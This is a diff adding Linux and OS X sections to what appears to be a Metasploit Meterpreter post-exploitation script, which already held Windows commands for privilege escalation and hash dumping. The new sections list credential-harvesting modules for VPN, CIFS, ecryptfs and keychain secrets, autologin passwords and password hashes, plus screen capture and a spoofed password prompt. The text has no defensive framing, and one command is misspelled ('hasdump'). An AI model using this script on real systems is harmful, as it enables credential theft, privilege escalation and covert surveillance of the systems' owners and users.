@@ -1,3 +1,7 @@
+# Work in progress
+# Need to add logic to test for OS type, then run corresponding modules.
+
+# Windows
 use priv
 getsystem
 getuid
@@ -5,3 +9,32 @@ sysinfo
 hasdump
 run get_application_list
 run winenum
+
+# Linux
+post/linux/gather/checkvm
+post/linux/gather/ecryptfs_creds
+post/linux/gather/enum_configs
+post/linux/gather/enum_network
+post/linux/gather/enum_protections
+post/linux/gather/enum_psk
+post/linux/gather/enum_system
+post/linux/gather/enum_users_history
+post/linux/gather/enum_xchat
+post/linux/gather/gnome_commander_creds
+post/linux/gather/mount_cifs_creds       
+post/linux/gather/openvpn_credentials
+post/linux/gather/pptpd_chap_secrets
+post/linux/gather/hashdump
+
+# OS X
+post/osx/capture/screen
+post/osx/gather/autologin_password
+post/osx/gather/enum_adium
+post/osx/gather/enum_airport
+post/osx/gather/enum_chicken_vnc_profile
+post/osx/gather/enum_colloquy
+post/osx/gather/enum_keychain
+post/osx/gather/enum_osx
+post/osx/gather/password_prompt_spoof
+post/osx/gather/safari_lastsession
+post/osx/gather/hashdump
